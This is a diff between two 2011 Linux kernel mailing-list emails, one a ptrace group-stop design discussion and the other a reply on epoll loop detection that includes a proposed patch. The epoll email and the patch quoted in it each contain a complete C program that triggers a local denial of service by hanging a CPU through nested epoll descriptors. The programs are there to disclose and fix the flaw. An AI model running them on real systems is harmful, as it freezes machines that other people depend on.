@@ -1,175 +1,294 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1751263Ab1BZCsO (ORCPT <rfc822;w@1wt.eu>);
-	Fri, 25 Feb 2011 21:48:14 -0500
-Received: from mail-bw0-f46.google.com ([209.85.214.46]:56586 "EHLO
-	mail-bw0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1750725Ab1BZCsM convert rfc822-to-8bit (ORCPT
+	id S1750992Ab1BZC6h (ORCPT <rfc822;w@1wt.eu>);
+	Fri, 25 Feb 2011 21:58:37 -0500
+Received: from mail-vx0-f174.google.com ([209.85.220.174]:64474 "EHLO
+	mail-vx0-f174.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1750859Ab1BZC6e (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Fri, 25 Feb 2011 21:48:12 -0500
+	Fri, 25 Feb 2011 21:58:34 -0500
 DomainKey-Signature: a=rsa-sha1; c=nofws;
-        d=googlemail.com; s=gamma;
-        h=from:to:subject:date:user-agent:cc:references:in-reply-to
-         :mime-version:content-type:content-transfer-encoding
-         :content-disposition:message-id;
-        b=vp+QF3B/mp60DxDcMHb+g2qTrk+N02v1jHqXVrFASO+YN1hypqJHyYdg2YiW2JAkYs
-         Iyz0Dcg118FvKCOvwz2Zc5PqhmRNb7wpD9z8tyRUs/Vqb1ykxu9jOIbGUmQ+wxfi6gzr
-         VLKle5lBBlq0L50+merd7mdh2ljZRcoGaCEwc=
-From: Denys Vlasenko <vda.linux@googlemail.com>
-To: Tejun Heo <tj@kernel.org>
-Subject: Re: [PATCH 1/1] ptrace: make sure do_wait() won't hang after PTRACE_ATTACH
-Date: Sat, 26 Feb 2011 03:48:03 +0100
-User-Agent: KMail/1.8.2
-Cc: Oleg Nesterov <oleg@redhat.com>, Roland McGrath <roland@redhat.com>,
-        jan.kratochvil@redhat.com, linux-kernel@vger.kernel.org,
-        torvalds@linux-foundation.org, akpm@linux-foundation.org
-References: <20110214190141.GA19221@redhat.com> <20110224202941.GA12258@redhat.com> <20110225155142.GQ24828@htj.dyndns.org>
-In-Reply-To: <20110225155142.GQ24828@htj.dyndns.org>
+        d=ksplice.com; s=google;
+        h=date:from:to:cc:subject:message-id:references:mime-version
+         :content-type:content-disposition:in-reply-to:user-agent;
+        b=fA+Jj2zroi3i5XNms5JkCmzYKqrR/44BL8om63ud9zLkAw4LvYalU2J/kJEgzsru2q
+         mGcJHFIM3TYzGfXS5a6fpw2xj9BV8zzDVU4lU+wA+yUX0TxN4HyZMTu1uUlNpl7yA1Ku
+         E9w//FX648puqSuGJoRbSebrmPICFFVj49KrE=
+Date: Fri, 25 Feb 2011 21:58:30 -0500
+From: Nelson Elhage <nelhage@ksplice.com>
+To: Jason Baron <jbaron@redhat.com>
+Cc: davidel@xmailserver.org, akpm@linux-foundation.org,
+        linux-kernel@vger.kernel.org, linux-fsdevel@vger.kernel.org,
+        security@kernel.org
+Subject: Re: [PATCH] optimize epoll loop detection
+Message-ID: <20110226025830.GA22935@ksplice.com>
+References: <201102251950.p1PJorw9023013@int-mx12.intmail.prod.int.phx2.redhat.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: 7BIT
+Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-Message-Id: <201102260348.03312.vda.linux@googlemail.com>
+In-Reply-To: <201102251950.p1PJorw9023013@int-mx12.intmail.prod.int.phx2.redhat.com>
+User-Agent: Mutt/1.5.20 (2009-06-14)
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Friday 25 February 2011 16:51, Tejun Heo wrote:
-> > > * ptrace, sans the odd SIGSTOP on attach which we should remove, is
-> > >   per-task.  Sending out SIGCONT on PTRACE_CONT would break that.  I
-> > >   really don't think that's a good idea.
-> > 
-> > Hmm. But why do you think we should always send SIGCONT after attach?
+This patch looks reasonable to me, but unfortunately, thinking about
+this, the problem is even worse than you've described.
+
+In particular, causing a wakeup up an epoll fd makes it wakeup any
+epoll fds that contain it. So if I have a big tree of epoll fd's, and
+trigger a wakeup on the right one, the kernel does the exact same kind
+of brute-force walk of the entire tree.
+
+This is somewhat worse than your example in that you can make it
+happen in interrupt context (since it's triggered by an fd wakeup,
+instead of directly from a syscall), but also because it exists even
+before the recent patch.
+
+Secondly, because epoll fd's actually store (struct file*, int fd)
+pairs, you can add a single epoll fd to another fd multiple times, so
+you can carry out the same attack with only 4 epoll fd's, which you
+take turns dup()ing, adding to the next one, and then closing
+all-but-one references to. This lets you crank the base of the
+exponent up almost to RLIMIT_NOFILE, instead of RLIMIT_NOFILE/4. The
+following test program causes one CPU to hang basically indefinitely,
+even without the cycle-prevention patch:
+
+-----
+#include <unistd.h>
+#include <sys/epoll.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#define DEPTH 6
+#define FANOUT 1000
+
+void die(const char *msg) {
+    perror(msg);
+    exit(-1);
+}
+
+void add_many(int parent, int child) {
+    int i;
+    int fds[FANOUT];
+    struct epoll_event evt = { .events = EPOLLIN };
+    for (i = 0; i < FANOUT; i++) {
+        if ((fds[i] = dup(child)) < 0)
+            die("dup");
+
+        if (epoll_ctl(parent, EPOLL_CTL_ADD, fds[i], &evt) < 0)
+            die("add");
+    }
+    for (i = 0; i < FANOUT; i++)
+        close(fds[i]);
+}
+
+int main(void) {
+    int fds[DEPTH];
+    int i;
+    int p[2];
+    struct epoll_event evt = { .events = EPOLLIN };
+
+    for (i = 0; i < DEPTH; i++) {
+        if ((fds[i] = epoll_create(1)) < 0)
+            die("create");
+    }
+    for (i = 1; i < DEPTH; i++) {
+        add_many(fds[i-1], fds[i]);
+    }
+    if (pipe(p) < 0)
+        die("pipe");
+
+    epoll_ctl(fds[DEPTH-1], EPOLL_CTL_ADD, p[0], &evt);
+    write(p[1], p, sizeof(int));
+
+    return 0;
+}
+----
+
+A similar marking-visited-fds patch might be workable here, but the
+concurrency is going to be much trickier, since there may be multiple
+wakeups going on at once.
+
+- Nelson
+
+On Fri, Feb 25, 2011 at 02:50:53PM -0500, Jason Baron wrote:
+> Hi,
 > 
-> Hmmm... my sentences were confusing.  I was trying to say,
+> The recent epoll patch to prevent introducing cycles among the epoll
+> data structures is implemented using a brute force search. Although,
+> the epoll code limits path lengths to 4 deep, it is still possible
+> exploit the algorithm and cause a local dos. Using the program below,
+> I was able to busy the kernel to run for 15 minutes in the loop
+> detection algorithm. (That can't be good for real-time performance :))
 > 
-> * ptrace, as it currently stands, is largely per-task.  One exception
->   is the implicit SIGSTOP which is sent on PTRACE_ATTACH but this
->   should be replaced with a more transparent attach request which
->   doesn't affect jctl states.
+> The test program is diabolical, but it represents a local 'dos'
+> attack. The program can be run by any user, and uses almost all 1024
+> of its open file descriptor limit. If that limit were raised by a
+> sysadmin, the program could be run indefinitely. (The run time is
+> basically: (max # of open file descriptors / 4) ^ 4. So in the
+> case of 1024 max file descriptor, we generate ~256 ^ 4 path checks,
+> which causes a quite a lot of function calls.
 > 
-> * Sending out SIGCONT on PTRACE_CONT on jctl stopped tracee adds
->   another exception to per-task behavior, which I don't think is a
->   good idea.
-
-Guys, it looks like we finally identified some points on which
-everyone on this thread agrees (at least I don't see any strong
-objections).
-
-To enumerate:
-
-* PTRACE_ATTACH's insertion of SIGSTOP is a design bug, but it is
-  so ingrained by now that we don't want to change PTRACE_ATTACH
-  semantic. We fix this situation by introducing a new ptrace call,
-  PTRACE_ATTACH_NOSTOP, which has saner API.
-
-* group-stop state is currently not preserved across ptrace-stop.
-  This makes, in particular, ^Z and SIGSTOP inoperative for straced
-  programs. Everyone agrees this needs to be fixed.
-  (There is a small bug of not notifying real parent about the group-stop,
-  I don't want to go there since it is also non-contentious - everybody
-  is in agreement this also should be fixed in "obvious" way).
-
-* HOWEVER, this behavior _is_ indeed used by gdb to run small fragments
-  of tracee even if it's stopped. Jan's example:
-    # gdb -p applicationpid
-    (gdb) print getpid()
-    (gdb) print show_me_your_internal_debug_dump()
-    (gdb) continue
-  gdb people want to preserve this feature.
-  How gdb implements this? I ssume it does this by modifying IP,
-  setting a breakpoint on return address, and issues PTRACE_CONT(0).
-  Currently it works because of "group-stop is ignored under ptrace" bug.
-
-
-How we can accomodate this gdb need while fixing this bug?
-
-
-Oleg's POV is that gdb should SIGCONT the tracee (at least if it is
-currently in group-stop). This has the advantage of using standard Unix
-tool. The disadvantage is that SIGCONT will wake up *all* threads,
-and that it will cause user-visible effects (SIGCONT handler will be run,
-parent can (or "should be able to", we may have a bug there too)
-see child to be WCONTINUED.
-
-Frankly, it seems that this is hardly acceptable for gdb. gdb people
-do want here a "secret" backdoor-ish way to make a *thread*
-(not the whole process) running even when the process is in group-stop.
-Yes, this is a "violation" of the convention that normally
-stopped process has all threads stopped, and it makes Oleg feel
-it is "wrong", but it is also useful, and used in real life.
-We can't ignore that.
-
-
-Jan's idea is to make kernel remember group-stop state upon attach,
-preserve current behavior of ignoring group-stop while attached,
-and restore group-stop upon detach.
-Sorry Jan, this won't work in many cases. It won't fix the
-"stracing makes process ignore SIGSTOP" bug - the result will be
-that buggy behavior will be still observed. Neither it will work for
-    # gdb -p applicationpid
-    (gdb) print getpid()
-    (gdb) print show_me_your_internal_debug_dump()
-    (gdb) continue
-- the "continue" will make application run even if we attached to it while
-it was stopped. It will ONLY work for
-    # gdb -p applicationpid
-    (gdb) print getpid()
-    (gdb) print show_me_your_internal_debug_dump()
-    (gdb) quit
-sequence. Which is good, but not good enough.
-
-
-Tejun, you are disagreeng with Oleg's proposal. Do you have a proposal
-which looks better to you? Or do you propose to just leave it as-is,
-that is, to continue to ignore group-stop under ptrace?
-
-
->From my side, i really want to see "group-stop is ignored under ptrace"
-bug fixed, yet I feel gdb's needs are legitimate. Perhaps I can help
-by presenting a few ideas how to open a backdoor in ptrace API for gdb:
-
-(a) Special-case ptrace(PTRACE_CONT/SYSCALL, pid, 0, SIGCONT) to do
-"special restart for gdb" thing. Problem with this idea is that we can
-be in ptrace-stop caused by genuine signal delivery, and using
-ptrace(PTRACE_CONT/SYSCALL, SIGCONT) from it means "inject SIGCONT".
-IOW: this creates ambiquity.
-
-    or
-
-(b) Abuse "addr" parameter in ptrace(PTRACE_CONT/SYSCALL, pid, addr, sig).
-Currently, it is unused. Can we define a value for it which means
-"do gdb hacky restart under group-stop, if tracee is indeed under group-stop"?
-(the value should be different from 0 and 0x1 - values currently used by strace)
-
-    or
-
-(c) Add ptrace(PTRACE_CONT2/SYSCALL2/SINGLESTEP2) with the semantic of
-"do gdb hacky restart under group-stop, if tracee is indeed under group-stop".
-I like it less because we have at least three restarting PTRACE_foo,
-maybe even four if we want to have DETACH2 too.
-Duplicating every one of them feels ugly.
-
-    or
-
-(d) Add a ptrace option PTRACE_O_IGNORE_JOB_STOP which can be set/cleared
-by PTRACE_SETOPTIONS and which modifies ptrace-restart behavior.
-gdb will set the option before it wants to do
-"restart-which-ignores-group-stop", and clears it again when it
-no longer wants it. In the example above:
-    # gdb -p applicationpid
-    (gdb) print getpid() # sets IGNORE_JOB_STOP before PTRACE_CONT(0)
-    (gdb) print show_me_your_internal_debug_dump() # sets IGNORE_JOB_STOP
-    (gdb) continue       # clears IGNORE_JOB_STOP before PTRACE_CONT(0)
-
-
-Unfortunately, none of them look particularly elegant, and all of them
-will require gdb to be changed.
-
-Jan, which one of these proposed changes to API looks "least bad" to you
-from gdb POV?
-
-Of course, feel free to provide a better proposal.
-
--- 
-vda
+> We can improve the loop detection code, to not be brute force, and
+> make sure that it doesn't re-visit nodes that it has already visited.
+> Using this optimized version the 15 minute test ran in .3 seconds.
+> The algorithm relies on the fact that there are no cycles in the
+> graph to begin with, and thus the newly added link must be involved
+> in the cycle (if there is one introduced).
+> 
+> I've re-tested the original test program, and the diabolical test
+> case below, but otherwise haven't done further epoll testing.
+> 
+> test program:
+> 
+> #include <unistd.h>
+> #include <sys/epoll.h>
+> #include <sys/time.h>
+> #include <stdio.h>
+> 
+> #define SIZE 250
+> 
+> int main(void) {
+> 
+> 	int links[SIZE];
+> 	int links2[SIZE];
+> 	int links3[SIZE];
+> 	int links4[SIZE];
+> 	int i, j;
+> 	int ret;
+> 	int ep1, ep2;
+> 	struct timeval start, end;
+> 
+> 	struct epoll_event evt = {
+> 		.events = EPOLLIN
+> 	};
+> 
+> 	ep1 = epoll_create(1);
+> 	for (i = 0; i < SIZE; i++) {
+> 		links[i] = epoll_create(1);
+> 		ret = epoll_ctl(ep1, EPOLL_CTL_ADD, links[i], &evt);
+> 		if (ret)
+> 			perror("error 1");
+> 	}
+> 	for (i = 0; i < SIZE; i++) {
+> 		links2[i] = epoll_create(1);
+> 		for (j = 0; j < SIZE; j++) {
+> 			epoll_ctl(links[j], EPOLL_CTL_ADD, links2[i], &evt);
+> 			if (ret)
+> 				perror("error 2");
+> 		}
+> 	}
+> 	for (i = 0; i < SIZE; i++) {
+> 		links3[i] = epoll_create(1);
+> 		for (j = 0; j < SIZE; j++) {
+> 			epoll_ctl(links2[j], EPOLL_CTL_ADD, links3[i], &evt);
+> 			if (ret)
+> 				perror("error 3");
+> 		}
+> 	}
+> 	for (i = 0; i < SIZE; i++) {
+> 		links4[i] = epoll_create(1);
+> 		for (j = 0; j < SIZE; j++) {
+> 			epoll_ctl(links3[j], EPOLL_CTL_ADD, links4[i], &evt);
+> 			if (ret)
+> 				perror("error 4");
+> 		}
+> 	}
+> 
+>  	ep2 = epoll_create(1);
+> 	gettimeofday(&start, NULL);
+> 	ret = epoll_ctl(ep2, EPOLL_CTL_ADD, ep1, &evt);
+> 	/* creates a loop */
+> 	//ret = epoll_ctl(links4[499], EPOLL_CTL_ADD, ep1, &evt);
+> 	if (ret)
+> 		perror("error 5");
+> 	gettimeofday(&end, NULL);
+> 
+> 	printf("%ld\n", ((end.tv_sec * 1000000 + end.tv_usec)
+> 		- (start.tv_sec * 1000000 + start.tv_usec)));
+> 
+> 	return 0;
+> 
+> }
+> 
+> thanks,
+> 
+> -Jason
+> 
+> Signed-off-by: Jason Baron <jbaron@redhat.com>
+> ---
+>  fs/eventpoll.c |   26 ++++++++++++++++++++++++--
+>  1 files changed, 24 insertions(+), 2 deletions(-)
+> 
+> diff --git a/fs/eventpoll.c b/fs/eventpoll.c
+> index 4a09af9..ea74bc9 100644
+> --- a/fs/eventpoll.c
+> +++ b/fs/eventpoll.c
+> @@ -95,6 +95,9 @@ struct epoll_filefd {
+>  	int fd;
+>  };
+>  
+> +/* used to keep track of visited nodes, so they can be cleared */
+> +LIST_HEAD(visited_list);
+> +
+>  /*
+>   * Structure used to track possible nested calls, for too deep recursions
+>   * and loop cycles.
+> @@ -188,6 +191,10 @@ struct eventpoll {
+>  
+>  	/* The user that created the eventpoll descriptor */
+>  	struct user_struct *user;
+> +
+> +	/* used to optimize loop detection check */
+> +	int visited;
+> +	struct list_head visitedllink;
+>  };
+>  
+>  /* Wait structure used by the poll hooks */
+> @@ -1228,16 +1235,22 @@ static int ep_loop_check_proc(void *priv, void *cookie, int call_nests)
+>  	int error = 0;
+>  	struct file *file = priv;
+>  	struct eventpoll *ep = file->private_data;
+> +	struct eventpoll *ep_tovisit;
+>  	struct rb_node *rbp;
+>  	struct epitem *epi;
+>  
+>  	mutex_lock(&ep->mtx);
+> +	ep->visited = 1;
+> +	list_add(&ep->visitedllink, &visited_list);
+>  	for (rbp = rb_first(&ep->rbr); rbp; rbp = rb_next(rbp)) {
+>  		epi = rb_entry(rbp, struct epitem, rbn);
+>  		if (unlikely(is_file_epoll(epi->ffd.file))) {
+> +			ep_tovisit = epi->ffd.file->private_data;
+> +			if (ep_tovisit->visited)
+> +				continue;
+>  			error = ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS,
+>  					       ep_loop_check_proc, epi->ffd.file,
+> -					       epi->ffd.file->private_data, current);
+> +					       ep_tovisit, current);
+>  			if (error != 0)
+>  				break;
+>  		}
+> @@ -1260,8 +1273,17 @@ static int ep_loop_check_proc(void *priv, void *cookie, int call_nests)
+>   */
+>  static int ep_loop_check(struct eventpoll *ep, struct file *file)
+>  {
+> -	return ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS,
+> +	int ret;
+> +	struct eventpoll *ep_cur, *ep_next;
+> +
+> +	ret = ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS,
+>  			      ep_loop_check_proc, file, ep, current);
+> +	/* clear visited list */
+> +	list_for_each_entry_safe(ep_cur, ep_next, &visited_list, visitedllink) {
+> +		ep_cur->visited = 0;
+> +		list_del(&ep_cur->visitedllink);
+> +	}
+> +	return ret;
+>  }
+>  
+>  /*
+> -- 
+> 1.7.1
+> 
